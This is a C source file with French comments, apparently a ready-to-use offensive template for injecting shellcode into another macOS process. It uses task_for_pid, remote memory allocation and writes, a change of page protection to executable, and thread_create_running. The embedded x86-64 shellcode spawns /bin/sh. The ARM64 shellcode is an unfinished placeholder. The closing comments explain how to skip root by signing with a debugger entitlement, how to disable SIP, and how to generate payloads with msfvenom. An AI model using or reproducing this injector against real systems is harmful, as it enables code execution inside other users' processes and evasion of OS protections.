/*
 * Template: Process Injector macOS
 * Technique: Mach task_for_pid + thread injection
 * Target: macOS x86-64/ARM64
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/thread_status.h>

// Shellcode exemple macOS x64: execve("/bin/sh", NULL, NULL)
unsigned char shellcode_x64[] =
    "\x48\x31\xf6"                              // xor rsi, rsi
    "\x56"                                      // push rsi
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00" // mov rdi, "/bin/sh"
    "\x57"                                      // push rdi
    "\x48\x89\xe7"                              // mov rdi, rsp
    "\x48\x31\xd2"                              // xor rdx, rdx
    "\xb8\x3b\x00\x00\x02"                      // mov eax, 0x200003b (BSD execve)
    "\x0f\x05";                                 // syscall

// Shellcode exemple macOS ARM64: execve("/bin/sh", NULL, NULL)
unsigned char shellcode_arm64[] =
    "\x48\x31\xf6"  // À compléter avec ARM64 shellcode
    "\x56";

// Obtenir task port pour PID (nécessite root ou entitlements)
kern_return_t get_task_for_pid(pid_t pid, mach_port_t *task) {
    kern_return_t kr;

    kr = task_for_pid(mach_task_self(), pid, task);
    if (kr != KERN_SUCCESS) {
        printf("[-] task_for_pid failed: %s (0x%x)\n", mach_error_string(kr), kr);
        printf("[!] Nécessite: root OU com.apple.security.cs.debugger entitlement\n");
        return kr;
    }

    printf("[+] Task port obtenu: 0x%x\n", *task);
    return KERN_SUCCESS;
}

// Allouer mémoire dans process distant
kern_return_t allocate_remote_memory(mach_port_t task, mach_vm_address_t *addr, mach_vm_size_t size) {
    kern_return_t kr;

    *addr = 0;
    kr = mach_vm_allocate(task, addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_allocate failed: %s\n", mach_error_string(kr));
        return kr;
    }

    printf("[+] Mémoire allouée à: 0x%llx (size: 0x%llx)\n", *addr, size);
    return KERN_SUCCESS;
}

// Écrire dans mémoire distante
kern_return_t write_remote_memory(mach_port_t task, mach_vm_address_t addr, unsigned char *data, mach_vm_size_t size) {
    kern_return_t kr;

    kr = mach_vm_write(task, addr, (vm_offset_t)data, (mach_msg_type_number_t)size);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_write failed: %s\n", mach_error_string(kr));
        return kr;
    }

    printf("[+] Données écrites: %llu bytes\n", size);
    return KERN_SUCCESS;
}

// Changer protection mémoire (RW -> RX)
kern_return_t protect_remote_memory(mach_port_t task, mach_vm_address_t addr, mach_vm_size_t size, vm_prot_t prot) {
    kern_return_t kr;

    kr = mach_vm_protect(task, addr, size, FALSE, prot);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_protect failed: %s\n", mach_error_string(kr));
        return kr;
    }

    printf("[+] Protection changée vers: %s%s%s\n",
           (prot & VM_PROT_READ) ? "R" : "-",
           (prot & VM_PROT_WRITE) ? "W" : "-",
           (prot & VM_PROT_EXECUTE) ? "X" : "-");
    return KERN_SUCCESS;
}

// Créer thread distant (x86-64)
kern_return_t create_remote_thread_x64(mach_port_t task, mach_vm_address_t entry_point) {
    kern_return_t kr;
    thread_act_t thread;
    x86_thread_state64_t state;

    // Initialiser registres
    memset(&state, 0, sizeof(state));
    state.__rip = entry_point;  // Point vers shellcode
    state.__rsp = entry_point + 0x1000; // Stack fictif
    state.__rbp = state.__rsp;

    printf("[*] Création thread distant...\n");
    printf("    RIP: 0x%llx\n", state.__rip);
    printf("    RSP: 0x%llx\n", state.__rsp);

    kr = thread_create_running(
        task,
        x86_THREAD_STATE64,
        (thread_state_t)&state,
        x86_THREAD_STATE64_COUNT,
        &thread
    );

    if (kr != KERN_SUCCESS) {
        printf("[-] thread_create_running failed: %s\n", mach_error_string(kr));
        return kr;
    }

    printf("[+] Thread créé: 0x%x\n", thread);
    return KERN_SUCCESS;
}

// Créer thread distant (ARM64)
kern_return_t create_remote_thread_arm64(mach_port_t task, mach_vm_address_t entry_point) {
    kern_return_t kr;
    thread_act_t thread;
    arm_thread_state64_t state;

    memset(&state, 0, sizeof(state));
    state.__pc = entry_point;           // Program counter
    state.__sp = entry_point + 0x1000;  // Stack pointer

    printf("[*] Création thread distant (ARM64)...\n");
    printf("    PC: 0x%llx\n", state.__pc);
    printf("    SP: 0x%llx\n", state.__sp);

    kr = thread_create_running(
        task,
        ARM_THREAD_STATE64,
        (thread_state_t)&state,
        ARM_THREAD_STATE64_COUNT,
        &thread
    );

    if (kr != KERN_SUCCESS) {
        printf("[-] thread_create_running failed: %s\n", mach_error_string(kr));
        return kr;
    }

    printf("[+] Thread créé: 0x%x\n", thread);
    return KERN_SUCCESS;
}

// Injection complète
int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    mach_port_t task;
    mach_vm_address_t remote_addr;
    kern_return_t kr;

    printf("[*] Injection dans PID %d...\n", pid);
    printf("[*] Shellcode size: %zu bytes\n\n", shellcode_size);

    // 1. Obtenir task port
    kr = get_task_for_pid(pid, &task);
    if (kr != KERN_SUCCESS) {
        return -1;
    }

    // 2. Allouer mémoire RW
    kr = allocate_remote_memory(task, &remote_addr, shellcode_size + 0x1000);
    if (kr != KERN_SUCCESS) {
        return -1;
    }

    // 3. Écrire shellcode
    kr = write_remote_memory(task, remote_addr, shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        return -1;
    }

    // 4. Changer protection RW -> RX
    kr = protect_remote_memory(task, remote_addr, shellcode_size + 0x1000,
                                 VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        return -1;
    }

    // 5. Créer thread distant
#ifdef __x86_64__
    kr = create_remote_thread_x64(task, remote_addr);
#elif defined(__aarch64__)
    kr = create_remote_thread_arm64(task, remote_addr);
#else
    printf("[-] Architecture non supportée\n");
    return -1;
#endif

    if (kr != KERN_SUCCESS) {
        return -1;
    }

    printf("\n[+] Injection réussie!\n");
    return 0;
}

// Lister tous les threads d'un process
void list_threads(mach_port_t task) {
    thread_act_array_t thread_list;
    mach_msg_type_number_t thread_count;
    kern_return_t kr;

    kr = task_threads(task, &thread_list, &thread_count);
    if (kr != KERN_SUCCESS) {
        printf("[-] task_threads failed\n");
        return;
    }

    printf("[*] Threads dans le process: %d\n", thread_count);
    for (unsigned int i = 0; i < thread_count; i++) {
        printf("    Thread %d: 0x%x\n", i, thread_list[i]);
    }

    vm_deallocate(mach_task_self(), (vm_address_t)thread_list,
                  thread_count * sizeof(thread_act_t));
}

int main(int argc, char *argv[]) {
    printf("=== macOS Process Injector ===\n\n");

    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        printf("\nExemple:\n");
        printf("  sudo %s 1234\n", argv[0]);
        printf("\nNotes:\n");
        printf("  - Nécessite root (sudo)\n");
        printf("  - OU entitlement: com.apple.security.cs.debugger\n");
        printf("  - SIP doit être désactivé pour certains process système\n");
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    if (target_pid <= 0) {
        printf("[-] PID invalide\n");
        return 1;
    }

    // Vérifier que process existe
    if (kill(target_pid, 0) != 0) {
        perror("[-] Process non trouvé");
        return 1;
    }

    printf("[+] Target PID: %d\n\n", target_pid);

    // Sélectionner shellcode selon architecture
#ifdef __x86_64__
    unsigned char *shellcode = shellcode_x64;
    size_t shellcode_size = sizeof(shellcode_x64) - 1;
    printf("[*] Architecture: x86-64\n");
#elif defined(__aarch64__)
    unsigned char *shellcode = shellcode_arm64;
    size_t shellcode_size = sizeof(shellcode_arm64) - 1;
    printf("[*] Architecture: ARM64\n");
#else
    printf("[-] Architecture non supportée\n");
    return 1;
#endif

    // Injection
    if (inject_shellcode(target_pid, shellcode, shellcode_size) < 0) {
        printf("\n[-] Injection échouée!\n");
        return 1;
    }

    return 0;
}

/*
 * Compilation:
 *   # x86-64
 *   clang injector_macos.c -o injector_macos -arch x86_64
 *
 *   # ARM64 (Apple Silicon)
 *   clang injector_macos.c -o injector_macos -arch arm64
 *
 *   # Universal binary
 *   clang injector_macos.c -o injector_macos -arch x86_64 -arch arm64
 *
 * Usage:
 *   sudo ./injector_macos 1234
 *
 * Permissions:
 *   1. Avec sudo (root):
 *      sudo ./injector_macos <pid>
 *
 *   2. Avec entitlement (pas besoin de root):
 *      - Créer entitlements.plist:
 *        <?xml version="1.0" encoding="UTF-8"?>
 *        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "...">
 *        <plist version="1.0">
 *        <dict>
 *            <key>com.apple.security.cs.debugger</key>
 *            <true/>
 *        </dict>
 *        </plist>
 *
 *      - Signer:
 *        codesign -s - --entitlements entitlements.plist -f injector_macos
 *
 *   3. SIP (System Integrity Protection):
 *      - Désactiver en Recovery Mode:
 *        csrutil disable
 *
 * Générer shellcode:
 *   msfvenom -p osx/x64/exec CMD=/bin/sh -f c
 *
 * Notes:
 *   - task_for_pid est la primitive fondamentale macOS
 *   - Plus fiable que ptrace sur macOS moderne
 *   - Hardened Runtime bloque cette technique sur apps signées
 *   - Alternative: DYLD_INSERT_LIBRARIES (DLL injection style)
 */
